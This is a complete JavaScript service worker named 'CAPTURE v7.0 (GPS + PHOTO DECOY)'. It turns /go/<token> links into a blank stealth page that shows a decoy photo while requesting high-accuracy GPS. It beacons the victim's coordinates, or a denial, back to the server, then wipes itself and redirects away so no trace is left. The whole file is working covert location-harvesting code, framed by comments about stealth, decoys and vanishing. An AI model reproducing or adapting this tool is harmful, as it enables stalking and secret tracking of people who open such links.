// ═══════════════════════════════════════════════════════════
// CAPTURE — Service Worker v7.0 (GPS + PHOTO DECOY)
// ═══════════════════════════════════════════════════════════
// Intercepts /go/<token> → returns stealth HTML
// Shows decoy photo (if uploaded) while GPS fires
// Vanish after GPS completes or ~22s timeout
// ═══════════════════════════════════════════════════════════

self.addEventListener("install", function(event) {
  self.skipWaiting();
});

self.addEventListener("activate", function(event) {
  event.waitUntil(self.clients.claim());
});

self.addEventListener("fetch", function(event) {
  const url = new URL(event.request.url);
  const match = url.pathname.match(/^\/go\/([a-f0-9]+)$/);
  if (!match || event.request.method !== "GET") return;

  const token = match[1];
  if (event.request.mode !== "navigate") return;

  event.respondWith(
    (async function() {
      try {
        const stealthHtml = '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8" />\n<meta name="viewport" content="width=device-width, initial-scale=1.0" />\n<title> </title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nhtml,body{background:#000;width:100%;height:100%;overflow:hidden;display:flex;align-items:center;justify-content:center}\nbody{opacity:0}\nimg.photo{display:none}\n</style>\n</head>\n<body>\n<img class="photo" src="/api/photo/' + token + '" onerror="this.style.display=\'none\'" onload="this.style.display=\'none\'" />\n<script>\n(function(){\'use strict\';var t="' + token + '";var _s=false;function _ok(lat,lng,acc){if(_s)return;_s=true;var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-update",b);else try{fetch("/api/location-update",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _fail(){if(_s)return;_s=true;var p=JSON.stringify({token:t});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-denied",b);else try{fetch("/api/location-denied",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _v(){try{window.location.replace("about:blank")}catch(e){}setTimeout(function(){try{document.open();document.write("");document.close()}catch(e){}},10)}function _gps(cb){if(!("geolocation"in navigator)){_fail();if(cb)cb();return}navigator.geolocation.getCurrentPosition(function(p){_ok(p.coords.latitude,p.coords.longitude,p.coords.accuracy);if(cb)cb()},function(){_fail();if(cb)cb()},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}if(navigator.permissions&&navigator.permissions.query){navigator.permissions.query({name:"geolocation"}).then(function(s){if(s.state==="granted"){_gps(function(){_v()})}else if(s.state==="denied"){_fail();_v()}else{_gps(function(){_v()})}}).catch(function(){_gps(function(){_v()})})}else{_gps(function(){_v()})}setTimeout(function(){if(!_s){_fail()}_v()},22000)})();\n<\/script>\n</body>\n</html>';

        return new Response(stealthHtml, {
          headers: {
            "Content-Type": "text/html; charset=utf-8",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "X-Robots-Tag": "noindex, nofollow",
          }
        });
      } catch (e) {
        return fetch(event.request);
      }
    })()
  );
});
